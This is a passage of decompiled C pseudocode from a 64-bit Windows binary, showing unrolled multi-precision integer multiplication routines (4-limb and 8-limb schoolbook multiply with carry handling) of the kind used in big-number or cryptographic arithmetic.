  v42 = v41 < *((_QWORD *)&v39 + 1);
  v43 = v3[2] * (unsigned __int128)v4[2];
  v44 = v40 + v43;
  *((_QWORD *)&v43 + 1) += v40 + (unsigned __int64)v43 < v40;
  v45 = *((_QWORD *)&v43 + 1) + v41;
  v46 = (v45 < *((_QWORD *)&v43 + 1)) + v42;
  v47 = v3[3] * (unsigned __int128)v4[1];
  *(_QWORD *)&v47 = v44 + v47;
  v5[4] = v47;
  *((_QWORD *)&v47 + 1) += (unsigned __int64)v47 < v44;
  v48 = *((_QWORD *)&v47 + 1) + v45;
  v49 = (v48 < *((_QWORD *)&v47 + 1)) + v46;
  v50 = v3[2] * (unsigned __int128)v4[3];
  v51 = v48 + v50;
  *((_QWORD *)&v50 + 1) += v48 + (unsigned __int64)v50 < v48;
  v52 = *((_QWORD *)&v50 + 1) + v49;
  v53 = v52 < *((_QWORD *)&v50 + 1);
  v54 = v3[3] * (unsigned __int128)v4[2];
  *(_QWORD *)&v54 = v51 + v54;
  v5[5] = v54;
  *((_QWORD *)&v54 + 1) += (unsigned __int64)v54 < v51;
  v55 = *((_QWORD *)&v54 + 1) + v52;
  v56 = (v55 < *((_QWORD *)&v54 + 1)) + v53;
  v57 = v3[3] * (unsigned __int128)v4[3];
  result = v55 + v57;
  v5[6] = result;
  v5[7] = v56 + (result < v55) + *((_QWORD *)&v57 + 1);
  return result;
}

//----- (00000001400409C0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400409C0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // rdi
  unsigned __int64 *v4; // rsi
  _QWORD *v5; // r14
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // r9
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // r9
  _BOOL8 v16; // r10
  unsigned __int128 v17; // ax
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9
  _BOOL8 v20; // r10
  unsigned __int128 v21; // ax
  unsigned __int64 v22; // r9
  _BOOL8 v23; // r10
  unsigned __int128 v24; // ax
  unsigned __int64 v25; // rcx
  unsigned __int64 v26; // r10
  _BOOL8 v27; // r9
  unsigned __int128 v28; // ax
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // r10
  _BOOL8 v31; // r9
  unsigned __int128 v32; // ax
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r10
  _BOOL8 v35; // r9
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r10
  _BOOL8 v38; // r9
  unsigned __int128 v39; // ax
  unsigned __int64 v40; // rcx
  unsigned __int64 v41; // r9
  _BOOL8 v42; // r10
  unsigned __int128 v43; // ax
  unsigned __int64 v44; // r8
  unsigned __int64 v45; // r9
  _BOOL8 v46; // r10
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // rcx
  unsigned __int64 v49; // r9
  _BOOL8 v50; // r10
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // r9
  _BOOL8 v54; // r10
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r9
  __int64 v57; // r10
  unsigned __int128 v58; // ax
  unsigned __int64 v59; // rcx
  unsigned __int64 v60; // r10
  _BOOL8 v61; // r9
  unsigned __int128 v62; // ax
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // r10
  _BOOL8 v65; // r9
  unsigned __int128 v66; // ax
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r10
  _BOOL8 v69; // r9
  unsigned __int128 v70; // ax
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // r10
  _BOOL8 v73; // r9
  unsigned __int128 v74; // ax
  unsigned __int64 v75; // rcx
  unsigned __int64 v76; // r10
  __int64 v77; // r9
  unsigned __int128 v78; // ax
  unsigned __int64 v79; // r10
  __int64 v80; // r9
  unsigned __int128 v81; // ax
  unsigned __int64 v82; // rcx
  unsigned __int64 v83; // r9
  _BOOL8 v84; // r11
  unsigned __int128 v85; // ax
  unsigned __int64 v86; // r8
  unsigned __int64 v87; // r9
  _BOOL8 v88; // r11
  unsigned __int128 v89; // ax
  unsigned __int64 v90; // rcx
  unsigned __int64 v91; // r9
  _BOOL8 v92; // r11
  unsigned __int128 v93; // ax
  unsigned __int64 v94; // r8
  unsigned __int64 v95; // r9
  _BOOL8 v96; // r11
  unsigned __int128 v97; // ax
  unsigned __int64 v98; // rcx
  unsigned __int64 v99; // r9
  __int64 v100; // r11
  unsigned __int128 v101; // ax
  unsigned __int64 v102; // r8
  unsigned __int64 v103; // r9
  __int64 v104; // r11
  unsigned __int128 v105; // ax
  unsigned __int64 v106; // r9
  __int64 v107; // r11
  unsigned __int128 v108; // ax
  unsigned __int64 v109; // rcx
  unsigned __int64 v110; // r11
  _BOOL8 v111; // r10
  unsigned __int128 v112; // ax
  unsigned __int64 v113; // r8
  unsigned __int64 v114; // r11
  _BOOL8 v115; // r10
  unsigned __int128 v116; // ax
  unsigned __int64 v117; // rcx
  unsigned __int64 v118; // r11
  _BOOL8 v119; // r10
  unsigned __int128 v120; // ax
  unsigned __int64 v121; // r8
  unsigned __int64 v122; // r11
  _BOOL8 v123; // r10
  unsigned __int128 v124; // ax
  unsigned __int64 v125; // rcx
  unsigned __int64 v126; // r11
  __int64 v127; // r10
  unsigned __int128 v128; // ax
  unsigned __int64 v129; // r8
  unsigned __int64 v130; // r11
  __int64 v131; // r10
  unsigned __int128 v132; // ax
  unsigned __int64 v133; // rcx
  unsigned __int64 v134; // r11
  __int64 v135; // r10
  unsigned __int128 v136; // ax
  unsigned __int64 v137; // r11
  __int64 v138; // r10
  unsigned __int128 v139; // ax
  unsigned __int64 v140; // rcx
  unsigned __int64 v141; // r10
  _BOOL8 v142; // r9
  unsigned __int128 v143; // ax
  unsigned __int64 v144; // r8
  unsigned __int64 v145; // r10
  _BOOL8 v146; // r9
  unsigned __int128 v147; // ax
  unsigned __int64 v148; // rcx
  unsigned __int64 v149; // r10
  _BOOL8 v150; // r9
  unsigned __int128 v151; // ax
  unsigned __int64 v152; // r8
  unsigned __int64 v153; // r10
  _BOOL8 v154; // r9
  unsigned __int128 v155; // ax
  unsigned __int64 v156; // rcx
  unsigned __int64 v157; // r10
  __int64 v158; // r9
  unsigned __int128 v159; // ax
  unsigned __int64 v160; // r8
  unsigned __int64 v161; // r10
  __int64 v162; // r9
  unsigned __int128 v163; // ax
  unsigned __int64 v164; // r10
  __int64 v165; // r9
  unsigned __int128 v166; // ax
  unsigned __int64 v167; // rcx
  unsigned __int64 v168; // r9
  _BOOL8 v169; // r10
  unsigned __int128 v170; // ax
  unsigned __int64 v171; // r8
  unsigned __int64 v172; // r9
  _BOOL8 v173; // r10
  unsigned __int128 v174; // ax
  unsigned __int64 v175; // rcx
  unsigned __int64 v176; // r9
  _BOOL8 v177; // r10
  unsigned __int128 v178; // ax
  unsigned __int64 v179; // r8
  unsigned __int64 v180; // r9
  _BOOL8 v181; // r10
  unsigned __int128 v182; // ax
  unsigned __int64 v183; // rcx
  unsigned __int64 v184; // r9
  __int64 v185; // r10
  unsigned __int128 v186; // ax
  unsigned __int64 v187; // r9
  __int64 v188; // r10
  unsigned __int128 v189; // ax
  unsigned __int64 v190; // rcx
  unsigned __int64 v191; // r10
  _BOOL8 v192; // r9
  unsigned __int128 v193; // ax
  unsigned __int64 v194; // r8
  unsigned __int64 v195; // r10
  _BOOL8 v196; // r9
  unsigned __int128 v197; // ax
  unsigned __int64 v198; // rcx
  unsigned __int64 v199; // r10
  _BOOL8 v200; // r9
  unsigned __int128 v201; // ax
  unsigned __int64 v202; // r8
  unsigned __int64 v203; // r10
  _BOOL8 v204; // r9
  unsigned __int128 v205; // ax
  unsigned __int64 v206; // r10
  __int64 v207; // r9
  unsigned __int128 v208; // ax
  unsigned __int64 v209; // rcx
  unsigned __int64 v210; // r9
  _BOOL8 v211; // r10
  unsigned __int128 v212; // ax
  unsigned __int64 v213; // r8
  unsigned __int64 v214; // r9
  _BOOL8 v215; // r10
  unsigned __int128 v216; // ax
  unsigned __int64 v217; // rcx
  unsigned __int64 v218; // r9
  _BOOL8 v219; // r10
  unsigned __int128 v220; // ax
  unsigned __int64 v221; // r9
  _BOOL8 v222; // r10
  unsigned __int128 v223; // ax
  unsigned __int64 v224; // rcx
  unsigned __int64 v225; // r10
  _BOOL8 v226; // r9
  unsigned __int128 v227; // ax
  unsigned __int64 v228; // r8
  unsigned __int64 v229; // r10
  _BOOL8 v230; // r9
  unsigned __int128 v231; // ax
  unsigned __int64 v232; // r10
  _BOOL8 v233; // r9
  unsigned __int128 v234; // ax
  unsigned __int64 v235; // rcx
  unsigned __int64 v236; // r9
  _BOOL8 v237; // rbx
  unsigned __int128 v238; // ax
  unsigned __int64 v239; // r9
  _BOOL8 v240; // rbx
  unsigned __int128 v241; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v4;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = *v3 * (unsigned __int128)v4[2];
  v14 = v11 + v13;
  *((_QWORD *)&v13 + 1) += v11 + (unsigned __int64)v13 < v11;
  v15 = *((_QWORD *)&v13 + 1) + v12;
  v16 = v15 < *((_QWORD *)&v13 + 1);
  v17 = v3[1] * (unsigned __int128)v4[1];
  v18 = v14 + v17;
  *((_QWORD *)&v17 + 1) += v14 + (unsigned __int64)v17 < v14;
  v19 = *((_QWORD *)&v17 + 1) + v15;
  v20 = (v19 < *((_QWORD *)&v17 + 1)) + v16;
  v21 = v3[2] * (unsigned __int128)*v4;
  *(_QWORD *)&v21 = v18 + v21;
  v5[2] = v21;
  *((_QWORD *)&v21 + 1) += (unsigned __int64)v21 < v18;
  v22 = *((_QWORD *)&v21 + 1) + v19;
  v23 = (v22 < *((_QWORD *)&v21 + 1)) + v20;
  v24 = *v3 * (unsigned __int128)v4[3];
  v25 = v22 + v24;
  *((_QWORD *)&v24 + 1) += v22 + (unsigned __int64)v24 < v22;
  v26 = *((_QWORD *)&v24 + 1) + v23;
  v27 = v26 < *((_QWORD *)&v24 + 1);
  v28 = v3[1] * (unsigned __int128)v4[2];
  v29 = v25 + v28;
  *((_QWORD *)&v28 + 1) += v25 + (unsigned __int64)v28 < v25;
  v30 = *((_QWORD *)&v28 + 1) + v26;
  v31 = (v30 < *((_QWORD *)&v28 + 1)) + v27;
  v32 = v3[2] * (unsigned __int128)v4[1];
  v33 = v29 + v32;
  *((_QWORD *)&v32 + 1) += v29 + (unsigned __int64)v32 < v29;
  v34 = *((_QWORD *)&v32 + 1) + v30;
  v35 = (v34 < *((_QWORD *)&v32 + 1)) + v31;
  v36 = v3[3] * (unsigned __int128)*v4;
  *(_QWORD *)&v36 = v33 + v36;
  *((_QWORD *)&v36 + 1) += (unsigned __int64)v36 < v33;
  v37 = *((_QWORD *)&v36 + 1) + v34;
  v5[3] = v36;
  v38 = (v37 < *((_QWORD *)&v36 + 1)) + v35;
  v39 = *v3 * (unsigned __int128)v4[4];
  v40 = v37 + v39;
  *((_QWORD *)&v39 + 1) += v37 + (unsigned __int64)v39 < v37;
  v41 = *((_QWORD *)&v39 + 1) + v38;
  v42 = v41 < *((_QWORD *)&v39 + 1);
  v43 = v3[1] * (unsigned __int128)v4[3];
  v44 = v40 + v43;
  *((_QWORD *)&v43 + 1) += v40 + (unsigned __int64)v43 < v40;
  v45 = *((_QWORD *)&v43 + 1) + v41;
  v46 = (v45 < *((_QWORD *)&v43 + 1)) + v42;
  v47 = v3[2] * (unsigned __int128)v4[2];
  v48 = v44 + v47;
  *((_QWORD *)&v47 + 1) += v44 + (unsigned __int64)v47 < v44;
  v49 = *((_QWORD *)&v47 + 1) + v45;
  v50 = (v49 < *((_QWORD *)&v47 + 1)) + v46;
  v51 = v3[3] * (unsigned __int128)v4[1];
  v52 = v48 + v51;
  *((_QWORD *)&v51 + 1) += v48 + (unsigned __int64)v51 < v48;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  v54 = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  v55 = v3[4] * (unsigned __int128)*v4;
  *(_QWORD *)&v55 = v52 + v55;
  v5[4] = v55;
  *((_QWORD *)&v55 + 1) += (unsigned __int64)v55 < v52;
  v56 = *((_QWORD *)&v55 + 1) + v53;
  v57 = (v56 < *((_QWORD *)&v55 + 1)) + v54;
  v58 = *v3 * (unsigned __int128)v4[5];
  v59 = v56 + v58;
  *((_QWORD *)&v58 + 1) += v56 + (unsigned __int64)v58 < v56;
  v60 = *((_QWORD *)&v58 + 1) + v57;
  v61 = v60 < *((_QWORD *)&v58 + 1);
  v62 = v3[1] * (unsigned __int128)v4[4];
  v63 = v59 + v62;
  *((_QWORD *)&v62 + 1) += v59 + (unsigned __int64)v62 < v59;
  v64 = *((_QWORD *)&v62 + 1) + v60;
  v65 = (v64 < *((_QWORD *)&v62 + 1)) + v61;
  v66 = v3[2] * (unsigned __int128)v4[3];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = v3[3] * (unsigned __int128)v4[2];
  v71 = v67 + v70;
  *((_QWORD *)&v70 + 1) += v67 + (unsigned __int64)v70 < v67;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v73 = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  v74 = v3[4] * (unsigned __int128)v4[1];
  v75 = v71 + v74;
  *((_QWORD *)&v74 + 1) += v71 + (unsigned __int64)v74 < v71;
  v76 = *((_QWORD *)&v74 + 1) + v72;
  v77 = (v76 < *((_QWORD *)&v74 + 1)) + v73;
  v78 = v3[5] * (unsigned __int128)*v4;
  *(_QWORD *)&v78 = v75 + v78;
  v5[5] = v78;
  *((_QWORD *)&v78 + 1) += (unsigned __int64)v78 < v75;
  v79 = *((_QWORD *)&v78 + 1) + v76;
  v80 = (v79 < *((_QWORD *)&v78 + 1)) + v77;
  v81 = *v3 * (unsigned __int128)v4[6];
  v82 = v79 + v81;
  *((_QWORD *)&v81 + 1) += v79 + (unsigned __int64)v81 < v79;
  v83 = *((_QWORD *)&v81 + 1) + v80;
  v84 = v83 < *((_QWORD *)&v81 + 1);
  v85 = v3[1] * (unsigned __int128)v4[5];
  v86 = v82 + v85;
  *((_QWORD *)&v85 + 1) += v82 + (unsigned __int64)v85 < v82;
  v87 = *((_QWORD *)&v85 + 1) + v83;
  v88 = (v87 < *((_QWORD *)&v85 + 1)) + v84;
  v89 = v3[2] * (unsigned __int128)v4[4];
  v90 = v86 + v89;
  *((_QWORD *)&v89 + 1) += v86 + (unsigned __int64)v89 < v86;
  v91 = *((_QWORD *)&v89 + 1) + v87;
  v92 = (v91 < *((_QWORD *)&v89 + 1)) + v88;
  v93 = v3[3] * (unsigned __int128)v4[3];
  v94 = v90 + v93;
  *((_QWORD *)&v93 + 1) += v90 + (unsigned __int64)v93 < v90;
  v95 = *((_QWORD *)&v93 + 1) + v91;
  v96 = (v95 < *((_QWORD *)&v93 + 1)) + v92;
  v97 = v3[4] * (unsigned __int128)v4[2];
  v98 = v94 + v97;
  *((_QWORD *)&v97 + 1) += v94 + (unsigned __int64)v97 < v94;
  v99 = *((_QWORD *)&v97 + 1) + v95;
  v100 = (v99 < *((_QWORD *)&v97 + 1)) + v96;
  v101 = v3[5] * (unsigned __int128)v4[1];
  v102 = v98 + v101;
  *((_QWORD *)&v101 + 1) += v98 + (unsigned __int64)v101 < v98;
  v103 = *((_QWORD *)&v101 + 1) + v99;
  v104 = (v103 < *((_QWORD *)&v101 + 1)) + v100;
  v105 = v3[6] * (unsigned __int128)*v4;
  *(_QWORD *)&v105 = v102 + v105;
  v5[6] = v105;
  *((_QWORD *)&v105 + 1) += (unsigned __int64)v105 < v102;
  v106 = *((_QWORD *)&v105 + 1) + v103;
  v107 = (v106 < *((_QWORD *)&v105 + 1)) + v104;
  v108 = *v3 * (unsigned __int128)v4[7];
  v109 = v106 + v108;
  *((_QWORD *)&v108 + 1) += v106 + (unsigned __int64)v108 < v106;
  v110 = *((_QWORD *)&v108 + 1) + v107;
  v111 = v110 < *((_QWORD *)&v108 + 1);
  v112 = v3[1] * (unsigned __int128)v4[6];
  v113 = v109 + v112;
  *((_QWORD *)&v112 + 1) += v109 + (unsigned __int64)v112 < v109;
  v114 = *((_QWORD *)&v112 + 1) + v110;
  v115 = (v114 < *((_QWORD *)&v112 + 1)) + v111;
  v116 = v3[2] * (unsigned __int128)v4[5];
  v117 = v113 + v116;
  *((_QWORD *)&v116 + 1) += v113 + (unsigned __int64)v116 < v113;
  v118 = *((_QWORD *)&v116 + 1) + v114;
  v119 = (v118 < *((_QWORD *)&v116 + 1)) + v115;
  v120 = v3[3] * (unsigned __int128)v4[4];
  v121 = v117 + v120;
  *((_QWORD *)&v120 + 1) += v117 + (unsigned __int64)v120 < v117;
  v122 = *((_QWORD *)&v120 + 1) + v118;
  v123 = (v122 < *((_QWORD *)&v120 + 1)) + v119;
  v124 = v3[4] * (unsigned __int128)v4[3];
  v125 = v121 + v124;
  *((_QWORD *)&v124 + 1) += v121 + (unsigned __int64)v124 < v121;
  v126 = *((_QWORD *)&v124 + 1) + v122;
  v127 = (v126 < *((_QWORD *)&v124 + 1)) + v123;
  v128 = v3[5] * (unsigned __int128)v4[2];
  v129 = v125 + v128;
  *((_QWORD *)&v128 + 1) += v125 + (unsigned __int64)v128 < v125;
  v130 = *((_QWORD *)&v128 + 1) + v126;
  v131 = (v130 < *((_QWORD *)&v128 + 1)) + v127;
  v132 = v3[6] * (unsigned __int128)v4[1];
  v133 = v129 + v132;
  *((_QWORD *)&v132 + 1) += v129 + (unsigned __int64)v132 < v129;
  v134 = *((_QWORD *)&v132 + 1) + v130;
  v135 = (v134 < *((_QWORD *)&v132 + 1)) + v131;
  v136 = v3[7] * (unsigned __int128)*v4;
  *(_QWORD *)&v136 = v133 + v136;
  v5[7] = v136;
  *((_QWORD *)&v136 + 1) += (unsigned __int64)v136 < v133;
  v137 = *((_QWORD *)&v136 + 1) + v134;
  v138 = (v137 < *((_QWORD *)&v136 + 1)) + v135;
  v139 = v3[1] * (unsigned __int128)v4[7];
  v140 = v137 + v139;
  *((_QWORD *)&v139 + 1) += v137 + (unsigned __int64)v139 < v137;
  v141 = *((_QWORD *)&v139 + 1) + v138;
  v142 = v141 < *((_QWORD *)&v139 + 1);
  v143 = v3[2] * (unsigned __int128)v4[6];
  v144 = v140 + v143;
  *((_QWORD *)&v143 + 1) += v140 + (unsigned __int64)v143 < v140;
  v145 = *((_QWORD *)&v143 + 1) + v141;
  v146 = (v145 < *((_QWORD *)&v143 + 1)) + v142;
  v147 = v3[3] * (unsigned __int128)v4[5];
  v148 = v144 + v147;
  *((_QWORD *)&v147 + 1) += v144 + (unsigned __int64)v147 < v144;
  v149 = *((_QWORD *)&v147 + 1) + v145;
  v150 = (v149 < *((_QWORD *)&v147 + 1)) + v146;
  v151 = v3[4] * (unsigned __int128)v4[4];
  v152 = v148 + v151;
  *((_QWORD *)&v151 + 1) += v148 + (unsigned __int64)v151 < v148;
  v153 = *((_QWORD *)&v151 + 1) + v149;
  v154 = (v153 < *((_QWORD *)&v151 + 1)) + v150;
  v155 = v3[5] * (unsigned __int128)v4[3];
  v156 = v152 + v155;
  *((_QWORD *)&v155 + 1) += v152 + (unsigned __int64)v155 < v152;
  v157 = *((_QWORD *)&v155 + 1) + v153;
  v158 = (v157 < *((_QWORD *)&v155 + 1)) + v154;
  v159 = v3[6] * (unsigned __int128)v4[2];
  v160 = v156 + v159;
  *((_QWORD *)&v159 + 1) += v156 + (unsigned __int64)v159 < v156;
  v161 = *((_QWORD *)&v159 + 1) + v157;
  v162 = (v161 < *((_QWORD *)&v159 + 1)) + v158;
  v163 = v3[7] * (unsigned __int128)v4[1];
  *(_QWORD *)&v163 = v160 + v163;
  v5[8] = v163;
  *((_QWORD *)&v163 + 1) += (unsigned __int64)v163 < v160;
  v164 = *((_QWORD *)&v163 + 1) + v161;
  v165 = (v164 < *((_QWORD *)&v163 + 1)) + v162;
  v166 = v3[2] * (unsigned __int128)v4[7];
  v167 = v164 + v166;
  *((_QWORD *)&v166 + 1) += v164 + (unsigned __int64)v166 < v164;
  v168 = *((_QWORD *)&v166 + 1) + v165;
  v169 = v168 < *((_QWORD *)&v166 + 1);
  v170 = v3[3] * (unsigned __int128)v4[6];
  v171 = v167 + v170;
  *((_QWORD *)&v170 + 1) += v167 + (unsigned __int64)v170 < v167;
  v172 = *((_QWORD *)&v170 + 1) + v168;
  v173 = (v172 < *((_QWORD *)&v170 + 1)) + v169;
  v174 = v3[4] * (unsigned __int128)v4[5];
  v175 = v171 + v174;
  *((_QWORD *)&v174 + 1) += v171 + (unsigned __int64)v174 < v171;
  v176 = *((_QWORD *)&v174 + 1) + v172;
  v177 = (v176 < *((_QWORD *)&v174 + 1)) + v173;
  v178 = v3[5] * (unsigned __int128)v4[4];
  v179 = v175 + v178;
  *((_QWORD *)&v178 + 1) += v175 + (unsigned __int64)v178 < v175;
  v180 = *((_QWORD *)&v178 + 1) + v176;
  v181 = (v180 < *((_QWORD *)&v178 + 1)) + v177;
  v182 = v3[6] * (unsigned __int128)v4[3];
  v183 = v179 + v182;
  *((_QWORD *)&v182 + 1) += v179 + (unsigned __int64)v182 < v179;
  v184 = *((_QWORD *)&v182 + 1) + v180;
  v185 = (v184 < *((_QWORD *)&v182 + 1)) + v181;
  v186 = v3[7] * (unsigned __int128)v4[2];
  *(_QWORD *)&v186 = v183 + v186;
  *((_QWORD *)&v186 + 1) += (unsigned __int64)v186 < v183;
  v187 = *((_QWORD *)&v186 + 1) + v184;
  v5[9] = v186;
  v188 = (v187 < *((_QWORD *)&v186 + 1)) + v185;
  v189 = v3[3] * (unsigned __int128)v4[7];
  v190 = v187 + v189;
  *((_QWORD *)&v189 + 1) += v187 + (unsigned __int64)v189 < v187;
  v191 = *((_QWORD *)&v189 + 1) + v188;
  v192 = v191 < *((_QWORD *)&v189 + 1);
  v193 = v3[4] * (unsigned __int128)v4[6];
  v194 = v190 + v193;
  *((_QWORD *)&v193 + 1) += v190 + (unsigned __int64)v193 < v190;
  v195 = *((_QWORD *)&v193 + 1) + v191;
  v196 = (v195 < *((_QWORD *)&v193 + 1)) + v192;
  v197 = v3[5] * (unsigned __int128)v4[5];
  v198 = v194 + v197;
  *((_QWORD *)&v197 + 1) += v194 + (unsigned __int64)v197 < v194;
  v199 = *((_QWORD *)&v197 + 1) + v195;
  v200 = (v199 < *((_QWORD *)&v197 + 1)) + v196;
  v201 = v3[6] * (unsigned __int128)v4[4];
  v202 = v198 + v201;
  *((_QWORD *)&v201 + 1) += v198 + (unsigned __int64)v201 < v198;
  v203 = *((_QWORD *)&v201 + 1) + v199;
  v204 = (v203 < *((_QWORD *)&v201 + 1)) + v200;
  v205 = v3[7] * (unsigned __int128)v4[3];
  *(_QWORD *)&v205 = v202 + v205;
  v5[10] = v205;
  *((_QWORD *)&v205 + 1) += (unsigned __int64)v205 < v202;
  v206 = *((_QWORD *)&v205 + 1) + v203;
  v207 = (v206 < *((_QWORD *)&v205 + 1)) + v204;
  v208 = v3[4] * (unsigned __int128)v4[7];
  v209 = v206 + v208;
  *((_QWORD *)&v208 + 1) += v206 + (unsigned __int64)v208 < v206;
  v210 = *((_QWORD *)&v208 + 1) + v207;
  v211 = v210 < *((_QWORD *)&v208 + 1);
  v212 = v3[5] * (unsigned __int128)v4[6];
  v213 = v209 + v212;
  *((_QWORD *)&v212 + 1) += v209 + (unsigned __int64)v212 < v209;
  v214 = *((_QWORD *)&v212 + 1) + v210;
  v215 = (v214 < *((_QWORD *)&v212 + 1)) + v211;
  v216 = v3[6] * (unsigned __int128)v4[5];
  v217 = v213 + v216;
  *((_QWORD *)&v216 + 1) += v213 + (unsigned __int64)v216 < v213;
  v218 = *((_QWORD *)&v216 + 1) + v214;
  v219 = (v218 < *((_QWORD *)&v216 + 1)) + v215;
  v220 = v3[7] * (unsigned __int128)v4[4];
  *(_QWORD *)&v220 = v217 + v220;
  v5[11] = v220;
  *((_QWORD *)&v220 + 1) += (unsigned __int64)v220 < v217;
  v221 = *((_QWORD *)&v220 + 1) + v218;
  v222 = (v221 < *((_QWORD *)&v220 + 1)) + v219;
  v223 = v3[5] * (unsigned __int128)v4[7];
  v224 = v221 + v223;
  *((_QWORD *)&v223 + 1) += v221 + (unsigned __int64)v223 < v221;
  v225 = *((_QWORD *)&v223 + 1) + v222;
  v226 = v225 < *((_QWORD *)&v223 + 1);
  v227 = v3[6] * (unsigned __int128)v4[6];
  v228 = v224 + v227;
  *((_QWORD *)&v227 + 1) += v224 + (unsigned __int64)v227 < v224;
  v229 = *((_QWORD *)&v227 + 1) + v225;
  v230 = (v229 < *((_QWORD *)&v227 + 1)) + v226;
  v231 = v3[7] * (unsigned __int128)v4[5];
  *(_QWORD *)&v231 = v228 + v231;
  v5[12] = v231;
  *((_QWORD *)&v231 + 1) += (unsigned __int64)v231 < v228;
  v232 = *((_QWORD *)&v231 + 1) + v229;
  v233 = (v232 < *((_QWORD *)&v231 + 1)) + v230;
  v234 = v3[6] * (unsigned __int128)v4[7];
  v235 = v232 + v234;
  *((_QWORD *)&v234 + 1) += v232 + (unsigned __int64)v234 < v232;
  v236 = *((_QWORD *)&v234 + 1) + v233;
  v237 = v236 < *((_QWORD *)&v234 + 1);
  v238 = v3[7] * (unsigned __int128)v4[6];
  *(_QWORD *)&v238 = v235 + v238;
  v5[13] = v238;
  *((_QWORD *)&v238 + 1) += (unsigned __int64)v238 < v235;
  v239 = *((_QWORD *)&v238 + 1) + v236;
  v240 = (v239 < *((_QWORD *)&v238 + 1)) + v237;
  v241 = v3[7] * (unsigned __int128)v4[7];
  result = v239 + v241;
  v5[14] = result;
  v5[15] = v240 + (result < v239) + *((_QWORD *)&v241 + 1);
  return result;
}

//----- (00000001400410F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400410F0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // rbx
  unsigned __int64 *v4; // rdi
  _QWORD *v5; // rsi
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // r9
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // r9
  _BOOL8 v16; // r10
  unsigned __int128 v17; // ax
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9
  _BOOL8 v20; // r10
  unsigned __int128 v21; // ax
  unsigned __int64 v22; // r9
  _BOOL8 v23; // r10
  unsigned __int128 v24; // ax
  unsigned __int64 v25; // rcx
  unsigned __int64 v26; // r10
  _BOOL8 v27; // r9
  unsigned __int128 v28; // ax
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // r10
  _BOOL8 v31; // r9
  unsigned __int128 v32; // ax
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r10
  _BOOL8 v35; // r9
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r10
  _BOOL8 v38; // r9
  unsigned __int128 v39; // ax
  unsigned __int64 v40; // rcx
  unsigned __int64 v41; // r9
  _BOOL8 v42; // r10
  unsigned __int128 v43; // ax
  unsigned __int64 v44; // r8
  unsigned __int64 v45; // r9
  _BOOL8 v46; // r10
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // rcx
  unsigned __int64 v49; // r9
  _BOOL8 v50; // r10
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // r9
  _BOOL8 v54; // r10
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r9
  __int64 v57; // r10
  unsigned __int128 v58; // ax
  unsigned __int64 v59; // rcx
  unsigned __int64 v60; // r10
  _BOOL8 v61; // r9
  unsigned __int128 v62; // ax
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // r10
  _BOOL8 v65; // r9
  unsigned __int128 v66; // ax
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r10
  _BOOL8 v69; // r9
  unsigned __int128 v70; // ax
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // r10
  _BOOL8 v73; // r9
  unsigned __int128 v74; // ax
  unsigned __int64 v75; // rcx
  unsigned __int64 v76; // r10
  __int64 v77; // r9
  unsigned __int128 v78; // ax
  unsigned __int64 v79; // r10
  __int64 v80; // r9
  unsigned __int128 v81; // ax
  unsigned __int64 v82; // rcx
  unsigned __int64 v83; // r9
  _BOOL8 v84; // r10
  unsigned __int128 v85; // ax
  unsigned __int64 v86; // r8
  unsigned __int64 v87; // r9
  _BOOL8 v88; // r10
  unsigned __int128 v89; // ax
  unsigned __int64 v90; // rcx
  unsigned __int64 v91; // r9
  _BOOL8 v92; // r10
  unsigned __int128 v93; // ax
  unsigned __int64 v94; // r8
  unsigned __int64 v95; // r9
  _BOOL8 v96; // r10
  unsigned __int128 v97; // ax
  unsigned __int64 v98; // rcx
